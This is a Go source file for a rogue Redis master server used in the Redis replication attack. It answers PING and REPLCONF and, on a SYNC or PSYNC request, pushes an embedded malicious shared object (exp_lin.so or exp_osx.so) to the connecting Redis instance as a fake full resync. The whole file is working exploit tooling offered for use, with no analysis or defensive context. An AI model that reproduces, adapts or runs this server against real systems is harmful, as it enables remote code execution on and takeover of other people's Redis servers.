package main

import (
	_ "embed"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"
)

//go:embed exp_lin.so
var payloadLinData []byte

//go:embed exp_osx.so
var payloadOsxData []byte

const CLRF = "\r\n"

// 生成随机的 40 字节十六进制字符串
func generateRandomRunID(n int) string {
	const letters = "0123456789abcdef"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func handleConnection(conn net.Conn, payload []byte) {
	defer conn.Close()
	log.Printf("Conn from %s", conn.RemoteAddr())

	for {
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil {
			log.Printf("Read error: %v", err)
			return
		}
		req := string(buf[:n])
		log.Printf("Req:\n%s", req)

		var resp string
		if strings.Contains(req, "PING") {
			resp = "+PONG" + CLRF
		} else if strings.Contains(req, "REPLCONF") {
			resp = "+OK" + CLRF
		} else if strings.Contains(req, "PSYNC") || strings.Contains(req, "SYNC") {
			runID := generateRandomRunID(40)
			resp = fmt.Sprintf("+FULLRESYNC %s 0%s", runID, CLRF)
			resp += fmt.Sprintf("$%d%s", len(payload), CLRF)
			_, err = conn.Write([]byte(resp))
			if err != nil {
				log.Printf("Write header error: %v", err)
				return
			}
			_, err = conn.Write(payload)
			if err != nil {
				log.Printf("Write payload error: %v", err)
				return
			}
			_, err = conn.Write([]byte(CLRF))
			if err != nil {
				log.Printf("Write CRLF error: %v", err)
				return
			}
			log.Printf("Payload sent, %d bytes", len(payload))
			return
		} else {
			log.Printf("Unknown cmd, close")
			return
		}

		if resp != "" {
			_, err = conn.Write([]byte(resp))
			if err != nil {
				log.Printf("Write resp error: %v", err)
				return
			}
			log.Printf("Resp sent:\n%s", resp)
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var osType string
	flag.StringVar(&osType, "os", "lin", "payload (lin|osx)")
	var lhost string
	var lport string
	flag.StringVar(&lhost, "lhost", "0.0.0.0", "listen host")
	flag.StringVar(&lport, "lport", "21000", "listen port")
	flag.Parse()

	var selectedPayload []byte
	if osType == "osx" {
		selectedPayload = payloadOsxData
		log.Println("Using OSX payload")
	} else {
		selectedPayload = payloadLinData
		log.Println("Using Linux payload")
	}

	listenAddr := fmt.Sprintf("%s:%s", lhost, lport)
	log.Printf("Listening on %s", listenAddr)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("Listen error: %v", err)
	}
	log.Printf("Server running on %s", listenAddr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handleConnection(conn, selectedPayload)

	}
}